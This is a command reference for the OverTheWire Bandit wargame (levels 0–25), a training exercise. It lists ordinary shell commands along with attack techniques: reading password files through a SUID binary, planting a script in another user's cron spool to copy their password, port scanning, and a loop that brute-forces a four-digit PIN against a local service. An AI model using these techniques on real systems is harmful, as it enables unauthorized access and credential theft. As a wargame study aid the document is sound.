# Command Memo – Bandit 0–25

Quick reference for commands used to solve levels 0 to 25 of Bandit (OverTheWire).

---

## 📁 Navigation & Files

| Command | Description |
|---|---|
| `pwd` | Print current directory |
| `ls`, `ls -la` | List files (including hidden) |
| `cd <dir>` | Change directory |
| `cat <file>` | Display file content |
| `cat ./-` | Read a file whose name is a dash |
| `cat "./file name"` | Read a file whose name contains spaces |
| `file <file>` | Detect file type (text, gzip, bzip2, tar, binary…) |
| `file ./*` | Check all files in the current directory at once |
| `mkdir /tmp/<dir>` | Create a temp working directory (level 12) |
| `cp <file> <dest>` | Copy a file to a writable location |

---

## 🔍 Search

| Command | Description |
|---|---|
| `grep "word" file` | Show lines containing `word` |
| `sort file` | Sort lines alphabetically |
| `uniq` | Remove consecutive duplicates |
| `uniq -c` | Count occurrences |
| `uniq -u` | Keep only unique lines |
| `find / -type f -user X -group Y -size 33c 2>/dev/null` | Search with multiple filters |

Useful `find` options: `-type`, `-user`, `-group`, `-size`, `! -executable`

---

## 🔤 Encoding & Text Processing

| Command | Description |
|---|---|
| `strings file` | Extract readable strings from a binary |
| `base64 -d file` | Decode base64 |
| `tr 'A-Za-z' 'N-ZA-Mn-za-m'` | Apply ROT13 cipher |

---

## 🧮 Hex Dump

| Command | Description |
|---|---|
| `xxd file` | Display a hex dump |
| `xxd -r hexdump > binary` | Rebuild binary from hex dump |

---

## 🗜️ Compression & Archives

| Format | Decompress |
|---|---|
| Gzip | `gunzip file.gz` or `gunzip -c file.gz > output` |
| Bzip2 | `bunzip2 file.bz2` or `bzip2 -dc file.bz2 > output` |
| Tar | `tar tf archive.tar` (list) / `tar xf archive.tar` (extract) |

---

## 🌐 Network

| Command | Description |
|---|---|
| `chmod 400 keyfile` | Set read-only for owner (required for SSH private keys) |
| `ssh user@host -p 2220` | Standard SSH connection |
| `ssh -i key user@host -p 2220` | SSH with private key |
| `scp -P 2220 user@host:file .` | Secure copy via SSH |
| `nc host port` | TCP connection with Netcat |
| `nc -l -p PORT` | Start a TCP listener on a port |
| `echo "data" \| nc -l -p PORT &` | Serve data in background via Netcat |

---

## 🔐 SSL/TLS & Port Scanning (Levels 15–17)

| Command | Description |
|---|---|
| `openssl s_client -connect host:port` | Connect to a host over SSL/TLS |
| `openssl s_client -connect host:port -ign_eof` | Keep connection open until response received |
| `nmap -p 31000-32000 localhost` | Scan a range of ports |
| `diff file1 file2` | Compare two files line by line |
| `chmod 600 keyfile` | Permissions required for SSH private keys |

---

## 🔒 SUID & SSH Tricks (Levels 18–20)

| Command | Description |
|---|---|
| `ssh user@host command` | Run a command over SSH without loading a shell |
| `./suid_binary cat /etc/bandit_pass/user` | Execute command with SUID binary privileges |
| `find / -perm -4000 -type f 2>/dev/null` | Find SUID binaries on the system |

---

## ⏰ Cron & Script Injection (Levels 21–23)

| Command | Description |
|---|---|
| `ls /etc/cron.d/` | List scheduled cron jobs |
| `cat /etc/cron.d/cronjob_banditXX` | Read a cron job configuration |
| `echo I am user banditXX \| md5sum \| cut -d ' ' -f 1` | Reproduce the hash-based filename |
| `cat /tmp/[hash]` | Read the file written by the cron script |

---

## 💉 Script Injection via Cron (Level 23)

```bash
mkdir /tmp/mydir && chmod 777 /tmp/mydir
echo -e '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/mydir/pass' > /tmp/script.sh
chmod +x /tmp/script.sh
cp /tmp/script.sh /var/spool/bandit24/foo/
cat /tmp/mydir/pass
```

`chmod 777` on the output directory is required so bandit24 can write the result.

---

## 💥 Brute Force (Level 24)

```bash
for i in $(seq 0 9999); do
    echo "PASSWORD $(printf '%04d' $i)"
done | nc localhost 30002
```

| Command | Description |
|---|---|
| `seq 0 9999` | Generate numbers 0 to 9999 |
| `printf '%04d' 7` | Format as 4-digit zero-padded string (`0007`) |
